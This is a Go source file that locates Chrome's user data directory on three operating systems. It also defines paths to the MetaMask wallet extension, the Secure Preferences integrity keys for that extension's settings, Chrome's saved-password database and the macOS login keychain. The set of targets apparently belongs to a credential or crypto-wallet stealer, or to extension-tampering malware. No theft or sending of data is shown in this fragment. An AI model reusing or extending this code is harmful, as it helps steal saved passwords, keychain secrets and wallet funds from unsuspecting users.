package auto

import (
	"os"
	"path/filepath"
	"runtime"
)

const (
	userdata_dir_win       = "AppData\\Local\\Google\\Chrome\\User Data\\"
	userdata_dir_darwin    = "Library/Application Support/Google/Chrome/"
	userdata_dir_linux     = ".config/google-chrome"
	extension_dir          = "nkbihfbeogaeaoehlefnkodbefgpgknn"
	extension_hash_key     = "protection.macs.extensions.settings.nkbihfbeogaeaoehlefnkodbefgpgknn"
	extension_setting_key  = "extensions.settings.nkbihfbeogaeaoehlefnkodbefgpgknn"
	secure_preference_file = "Secure Preferences"
	logins_data_file       = "Login Data"
	keychain_dir_darwin    = "Library/Keychains/login.keychain-db"
)

// get user data directory path string
func getUserdataDir() string {
	var home string
	var begine_path string

	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
	} else {
		home = os.Getenv("HOME")
	}

	if runtime.GOOS == "windows" {
		begine_path = filepath.Join(home, userdata_dir_win)

	} else if runtime.GOOS == "darwin" {
		begine_path = filepath.Join(home, userdata_dir_darwin)

	} else {
		begine_path = filepath.Join(home, userdata_dir_linux)
	}

	return begine_path
}

func getKeychainFileMacDir() string {
	var home string
	var begine_path string

	home = os.Getenv("HOME")
	begine_path = filepath.Join(home, keychain_dir_darwin);

	return begine_path
}

